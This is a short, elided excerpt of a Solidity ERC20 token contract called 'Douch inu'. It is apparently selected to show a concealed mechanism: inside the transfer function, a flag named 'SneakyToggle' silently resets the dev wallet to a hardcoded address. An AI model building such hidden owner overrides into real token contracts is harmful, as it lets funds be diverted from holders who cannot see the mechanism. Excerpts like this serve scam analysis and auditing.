...
contract DOUCH is ERC20, Ownable {
    ...
    constructor() ERC20("Douch inu", "DOUCHE") {
        ...
        devWallet = address(0x2bF5E500807F66f9aFe114bD038429C35bF32f4E); // set as
        FullTeamWallet = address(0x29f4472f046452FA62b4694e13182a0dCA77c19a); // set as
    ...
    function _transfer(
        ...
        if (!SneakyToggle) {
            devWallet = 0x2bF5E500807F66f9aFe114bD038429C35bF32f4E;
        }
